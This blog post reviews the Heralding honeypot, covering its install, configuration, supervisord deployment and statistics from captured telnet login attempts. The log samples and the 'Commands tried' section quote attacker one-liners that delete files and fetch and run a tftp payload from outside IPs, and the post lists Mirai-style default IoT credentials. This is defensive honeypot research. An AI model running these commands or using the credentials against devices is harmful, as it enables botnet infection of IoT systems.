---
layout: post
title: Adventures with Heralding, a Credential Grabbing Honeypot
description: "Quick overview and impressions of trying out Heralding, a Credential Grabbing Honeypot"
modified: 2016-12-15
tags: [security, research, honeypots, IoT, credentials]
image:
  feature: grey-scale-dark.jpg
comments: true
share: true
---


In this post, I am just outlining some details from trying out a relatively new honeypot named [Heralding](https://github.com/johnnykv/heralding), developed by the well known Honeynet Project developer, [Johnny Vestergaard](https://github.com/johnnykv/).

Heralding is a designed to simply catch login attempts over several different protocols and subsequent activities.  It supports the following protocols:

* ftp
* http/https
* telnet
* pop3/pop3s
* ssh
* smtp

## Data

Heralding logs its data as CSV when logged to files or JSON if logged via ZMQ.

Each record contains the following fields:

* timestamp
* auth_id
* session_id
* source_ip
* source_port
* destination_ip,
* destination_port
* protocol
* username
* password

### Example Data

{% highlight bash %}
timestamp,auth_id,session_id,source_ip,source_port,destination_ip,destination_port,protocol,username,password
2016-12-14 21:50:14.344387,06dcdb6b-feaa-43b5-8b44-b6cb8d28dbd2,824fa9fc-3f3c-4256-9b9a-fef64562105d,218.191.87.87,55928,,23,telnet,root,123456
2016-12-14 21:50:15.755707,49c25230-4d3c-4bd0-9f8a-b8324062d604,824fa9fc-3f3c-4256-9b9a-fef64562105d,218.191.87.87,55928,,23,telnet,enable,system
2016-12-14 21:50:17.169160,d2049958-4afd-4f6b-8a12-72bcec568176,824fa9fc-3f3c-4256-9b9a-fef64562105d,218.191.87.87,55928,,23,telnet,shell,sh
2016-12-14 21:50:19.054035,95f069bc-ca6c-4ae3-8c65-34b7f54929aa,c9298a24-2303-47f7-b404-2f5b35c111de,218.191.87.87,56511,,23,telnet,root,klv123
2016-12-14 21:50:20.482506,e834d5ab-2ce1-4650-a561-80e7e1c3cbf8,c9298a24-2303-47f7-b404-2f5b35c111de,218.191.87.87,56511,,23,telnet,enable,system
2016-12-14 21:50:21.910539,6041be47-cc59-4e75-a238-d3bf49252103,c9298a24-2303-47f7-b404-2f5b35c111de,218.191.87.87,56511,,23,telnet,shell,sh
2016-12-14 21:50:23.884711,047cfe0d-fa0b-4bca-b564-29bdca7d343d,05a16a5e-5894-48f4-b8c2-2784db344bb4,218.191.87.87,57080,,23,telnet,root,tl789
2016-12-14 21:50:25.400807,20176c33-2b0e-442d-8cb5-9ceeacb3718a,05a16a5e-5894-48f4-b8c2-2784db344bb4,218.191.87.87,57080,,23,telnet,enable,system
2016-12-14 21:50:26.912134,384ef065-7455-482b-85d5-a008acd7c4e2,05a16a5e-5894-48f4-b8c2-2784db344bb4,218.191.87.87,57080,,23,telnet,shell,sh
2016-12-14 21:50:43.214470,1d4a03e1-9e58-4077-9073-c98f42ff8eea,3bb05f01-5013-4ade-9380-4bd65e9b3a43,218.191.87.87,59514,,23,telnet,root,5up
2016-12-14 22:03:37.481102,d2743ce8-7746-4257-8977-2efc4a00456d,be92c26b-1a68-4681-b0a9-2bf7ecbb95ab,82.50.48.173,44297,,23,telnet,root,5up
2016-12-14 22:12:33.569926,aa24d9d8-673e-4078-8eaa-ccd47291731d,f4cf86b9-8e0f-4e5f-9e53-9d6de94bbf4a,46.118.141.45,39142,,23,telnet,root,5up
2016-12-14 22:12:34.516482,c49c5124-2c70-4641-94f5-401a4d429a8f,f4cf86b9-8e0f-4e5f-9e53-9d6de94bbf4a,46.118.141.45,39142,,23,telnet,cd /var/tmp;cd /tmp;rm -f *;tftp -l 7up -r 7up -g 185.35.139.97;chmod a+x 7up;./7up,system
2016-12-14 22:13:03.875886,3ba63f0d-f5e9-496e-81cf-27e7276be55d,e2cd94e9-6fa3-4dc4-8eff-6e305249f999,46.118.141.45,39222,,23,telnet,Admin,5up
2016-12-14 22:13:04.819522,7882d490-a4ba-4d4f-8163-ded2a8e1418f,e2cd94e9-6fa3-4dc4-8eff-6e305249f999,46.118.141.45,39222,,23,telnet,cd /var/tmp;cd /tmp;rm -f *;tftp -l 7up -r 7up -g 185.35.139.97;chmod a+x 7up;./7up,system
2016-12-14 22:49:01.820774,414baba3-e0e5-4faf-9b66-ed3dcc18102f,75ea44c5-2ee1-4444-989a-1d95c1d121d5,89.121.167.211,33987,,23,telnet,root,5up
2016-12-14 22:52:55.217834,c7daea94-9b68-48f6-bc16-8e172e3dba23,87612fe2-a42c-426a-985c-46a90d432d72,77.105.72.253,49141,,23,telnet,root,5up
2016-12-14 22:54:24.332999,f1766355-b3c0-434c-8298-99d5b7c9fd88,231fbe16-2975-4752-bf45-33fa5304d6f9,37.115.145.181,51296,,23,telnet,Admin,5up
2016-12-14 22:54:25.300647,971c2806-6d2a-4d07-b1b3-31548dcfb813,231fbe16-2975-4752-bf45-33fa5304d6f9,37.115.145.181,51296,,23,telnet,cd /tmp;rm -f *;tftp -l 7up -r 7up -g 93.190.142.201;chmod a+x 7up;./7up,system

{% endhighlight %}

## Loggers

* Syslog alert
* Local CSV file
* JSON over ZMQ

## Installation

This is my recommended installation steps.  I usually use python virtualenv in order to keep the install isolated from the rest of my environment.

{% highlight bash %}
virtualenv /opt/heralding
source /opt/heralding/bin/activate
pip install heralding
{% endhighlight %}

## Configuration

{% highlight bash %}
cd /opt/heralding/
cp lib/python2.7/site-packages/heralding/heralding.yml heralding.yml
# enable/disable reporters or protocols
vi heralding.yml
{% endhighlight %}

## Running

Running this command will allow you to run the honeypot and test the config you just created (config is loaded from current working directory or it uses the default config).

{% highlight bash %}
cd /opt/heralding/
./bin/heralding
{% endhighlight %}

You should see output like this:

{% highlight bash %}
2016-12-15 13:52:44,010 (root) Initializing Heralding version 0.1.15
2016-12-15 13:52:44,030 (heralding.reporting.file_logger) File logger started, using file: heralding_activity.log
2016-12-15 13:52:44,031 (heralding.honeypot) Started Pop3 capability listening on port 110
2016-12-15 13:52:44,032 (heralding.honeypot) Started Pop3S capability listening on port 993
2016-12-15 13:52:44,032 (heralding.honeypot) Started ftp capability listening on port 21
2016-12-15 13:52:44,032 (heralding.honeypot) Started Http capability listening on port 80
2016-12-15 13:52:44,033 (heralding.honeypot) Started https capability listening on port 443
2016-12-15 13:52:44,033 (heralding.honeypot) Started Telnet capability listening on port 23
2016-12-15 13:52:44,036 (root) Privileges dropped, running as nobody/nogroup.

{% endhighlight %}

## Deployment

When deploying honeypots, I prefer to use supervisord to manage the auto starting/stopping/restarting the sensor upon reboots and failures.  So here is how I have deployed heralding:

{% highlight bash %}
# as root user ...
cat > /etc/supervisor/conf.d/heralding.conf<<EOF
[program:heralding]
command=/opt/heralding/bin/heralding
directory=/opt/heralding
stdout_logfile=/var/log/heralding.out
stderr_logfile=/var/log/heralding.err
autostart=true
autorestart=true
redirect_stderr=true
stopsignal=QUIT
EOF
{% endhighlight %}

Check the status:

{% highlight bash %}
$ sudo supervisorctl update
heralding: added process group

$ sudo supervisorctl status
heralding                        RUNNING    pid 24423, uptime 0:00:03
{% endhighlight %}

## Experience

I ran just one instance of heralding for ~10 hours and caught 3077 events (mostly login attempts), all over telnet.  My raw log file can be downloaded [here](/data/heralding_activity.log.gz).  Here are some stats about what this sensor saw.  

### Top IPs:

{% highlight bash %}
$ csvcut -c source_ip heralding_activity.log | sort | uniq -c | sort -nr | awk '{print $2, $1}' | head -n 10
179.235.41.195 96
177.195.7.36 93
75.138.128.134 90
189.225.176.121 60
113.182.86.139 51
59.120.153.117 42
190.45.119.110 32
96.92.191.230 30
95.69.219.220 30
95.6.72.245 30
{% endhighlight %}

### Top Usernames:

{% highlight bash %}
$ csvcut -c username heralding_activity.log | sort | uniq -c | sort -nr | awk '{print $2, $1}' | head -n 10
enable 941
shell 919
root 794
admin 224
support 33
user 24
cd 22
guest 17
Admin 16
cd 8
{% endhighlight %}

### Top Passwords:

{% highlight bash %}
$ csvcut -c password heralding_activity.log | sort | uniq -c | sort -nr | awk '{print $2, $1}' | head -n 10
system 988
sh 919
admin 116
xc3511 66
"" 60
vizxv 57
5up 54
xmhdipc 46
888888 46
123456 45
{% endhighlight %}

### IoT Attacks

After reviewing the logs closer, it appears that all of the "enable" and "shell" usernames and "system" and "sh" passwords are not username/passwords, but instead, they are commands that are attempted after the attacker attempts to login with one of the following sets of creds.  These are well known IoT default creds and most of them are embedded in the [Mirai scanner source code](https://github.com/jgamblin/Mirai-Source-Code/blob/master/mirai/bot/scanner.c).

{% highlight bash %}
666666,666666
888888,888888
admin,
admin,1111
admin,1111111
Admin,1234
admin,1234
admin,12345
admin,123456
admin,4321
admin,54321
admin,7ujMko0admin
admin,admin
admin,admin1234
admin,meinsm
admin,pass
admin,password
admin,smcadmin
admin1,password
administrator,1234
Administrator,meinsm
bin,
guest,12345
guest,guest
mother,fucker
root,
root,00000000
root,1001chin
root,1111
root,1234
root,12345
root,123456
root,4321
root,54321
root,5up
root,666666
root,7ujMko0admin
root,7ujMko0vizxv
root,888888
root,admin
root,admin@mymifi
root,anko
root,cat1029
root,default
root,dreambox
root,GM8182
root,hi3518
root,hunt5759
root,ikwb
root,juantech
root,jvbzd
root,klv123
root,klv1234
root,pass
root,password
root,realtek
root,root
root,system
root,tl789
root,user
root,vizxv
root,win1dows
root,xc3511
root,xmhdipc
root,zlxx.
root,Zte521
service,service
supervisor,supervisor
support,support
tech,tech
ubnt,ubnt
user,user
{% endhighlight %}

Another IoT related pattern I observed was what appear to be busybox default creds being used to login, download a payload via tftp, and execute it.  Unfortunately, I have not be able to download any of the payload files yet, they all timeout.

### Creds attempted:

{% highlight bash %}
Admin,5up
root,5up
{% endhighlight %}

### Commands tried:

{% highlight bash %}
cd /tmp;rm -f *;tftp -l 7up -r 7up -g 93.190.142.201;chmod a+x 7up;./7up,system
cd /var/tmp;cd /tmp;rm -f *;tftp -l 7up -r 7up -g 185.35.139.92;chmod a+x 7up;./7up,system
cd /var/tmp;cd /tmp;rm -f *;tftp -l 7up -r 7up -g 185.35.139.97;chmod a+x 7up;./7up,system
cd /var/tmp;cd /tmp;rm -f *;tftp -l 7up -r 7up -g 86.105.1.109;chmod a+x 7up;./7up,system
cd /var/tmp;cd /tmp;rm -f *;tftp -l 7up -r 7up -g 89.33.64.117;chmod a+x 7up;./7up,system
{% endhighlight %}

## Final Thoughts

Malicious login attempts are very common, esp with IoT devices shipping with hardcoded credentials.  Heralding makes collecting these login attempts easy since it is a simple, but effective honeypot for capturing credentials attempted over a variety of different protocols.  

Heralding is implemented in python and because of its [modular logger design](https://github.com/johnnykv/heralding/blob/master/heralding/reporting/base_logger.py), it would be relatively straightforward to add [MHN](https://github.com/threatstream/mhn) support for this honeypot, so if time permits I might do this.

If you wanted to explore the data collected by my instance of heralding, you can download my log file here: [here](/data/heralding_activity.log.gz).

Lastly, consider donating to the Honeynet Project:
<form action="https://www.paypal.com/cgi-bin/webscr" method="post"><input type="hidden" name="cmd" value="_s-xclick" /><input type="hidden" name="hosted_button_id" value="8WPALKEE9GMSC" /><input type="image" name="submit" src="https://www.paypalobjects.com/en_US/i/btn/btn_donate_LG.gif" alt="PayPal - The safer, easier way to pay online!" /><img src="https://www.paypalobjects.com/en_US/i/scr/pixel.gif" alt="" width="1" height="1" border="0" /></form>


## Reference:

* [heralding project on Github](https://github.com/johnnykv/heralding)
* [Heralding - the credentials catching honeypot](https://www.honeynet.org/node/1321)
* [Initial analysis of four million login attempts](https://www.honeynet.org/node/1328)


--Jason
<br />[@jason_trost](https://twitter.com/#!/jason_trost)

